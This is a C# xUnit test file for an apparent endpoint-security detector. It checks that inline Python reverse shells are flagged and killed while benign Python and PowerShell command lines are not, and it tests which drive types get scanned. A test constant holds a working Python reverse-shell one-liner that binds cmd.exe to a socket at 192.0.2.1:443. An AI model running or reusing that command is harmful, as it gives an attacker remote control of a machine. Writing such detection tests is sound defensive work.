using System.IO;
using Sentinel.Core;
using Xunit;

namespace Sentinel.Tests
{
    public class InstallerRelayScenarioTests
    {
        private const string SocketShell = "python.exe -c \"import socket,subprocess; s=socket.socket(); s.connect(('192.0.2.1',443)); subprocess.call(['cmd.exe'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"";

        [Theory]
        [InlineData("python.exe")]
        [InlineData("pythonw.exe")]
        [InlineData("pythonw")]
        [InlineData("py")]
        [InlineData("python3.exe")]
        public void InlinePythonSocketShellIsTerminalWithoutKnownRelay(string name)
        {
            var result = new RawSocketRedirectRule().Evaluate(new FusedTelemetryContext
            {
                TriggeringEvent = new ProcessTelemetry { ProcessId = 4242, ProcessName = name, CommandLine = SocketShell }
            });
            Assert.NotNull(result);
            ResponsePolicy.EnforceDispatchPolicy(result!);
            Assert.Equal(SignalType.ReverseShell, result!.SignalType);
            Assert.True(result.KillAuthorized);
        }

        [Theory]
        [InlineData("python.exe game.py")]
        [InlineData("renpy.exe --game game")]
        [InlineData("python.exe -c \"import socket; s=socket.socket(); s.connect(('192.0.2.1',443)); print('connected')\"")]
        [InlineData("python.exe -c \"import subprocess; subprocess.call(['cmd.exe'])\"")]
        [InlineData("python.exe -c \"print('socket.socket(); subprocess.call')\"")]
        public void GamesNetworkingAndOrdinarySubprocessesAreNotSocketShells(string command)
            => Assert.False(PythonSocketShellHeuristics.IsSocketShell("python.exe", command));

        [Theory]
        [InlineData("stderr=s.fileno()", "stderr=None")]
        [InlineData("stdout=s.fileno()", "stdout=other.fileno()")]
        [InlineData("s.connect", "other.connect")]
        [InlineData("['cmd.exe']", "['game.exe']")]
        public void UnconnectedOrUnrelatedStreamsCannotAuthorizeKill(string original, string replacement)
            => Assert.False(PythonSocketShellHeuristics.IsSocketShell("python.exe", SocketShell.Replace(original, replacement)));

        [Theory]
        [InlineData("powershell.exe -Command \"$s=New-Object Net.Sockets.TcpClient; $s.GetStream()\"")]
        [InlineData("pwsh -c Write-Output 'New-Object Net.Sockets.TcpClient; GetStream; .Read(; .Write(; iex'")]
        public void RawRuleCannotBypassPowerShellCodeProof(string command)
        {
            var result = new RawSocketRedirectRule().Evaluate(new FusedTelemetryContext
            {
                TriggeringEvent = new ProcessTelemetry { ProcessId = 4242, ProcessName = "powershell.exe", CommandLine = command }
            });
            Assert.Null(result);
        }

        [Theory]
        [InlineData(DriveType.Fixed, true, true)]
        [InlineData(DriveType.Removable, true, true)]
        [InlineData(DriveType.Removable, false, false)]
        [InlineData(DriveType.Network, true, false)]
        [InlineData(DriveType.CDRom, true, false)]
        [InlineData(DriveType.Unknown, true, false)]
        public void ScanCoverageIncludesReadySecondaryAndRemovableVolumes(DriveType type, bool ready, bool expected)
            => Assert.Equal(expected, FileVerdictScanner.IsScannableDrive(type, ready));
    }
}
